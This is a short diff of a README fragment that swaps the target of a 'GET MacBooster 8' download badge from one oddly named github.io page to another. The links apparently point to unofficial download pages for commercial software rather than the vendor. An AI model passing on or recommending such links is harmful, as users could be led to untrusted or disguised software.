@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://tubus-jubus-apps.github.io/.github/macbooster8">  
+<a href="https://top-ssilka-apps.github.io/.github/macbooster8">  
 <img src="https://img.shields.io/badge/💻_GET_MacBooster_8-navy?style=for-the-badge&logo=apple" alt="GET MacBooster 8">  
 </a>  
 </div>
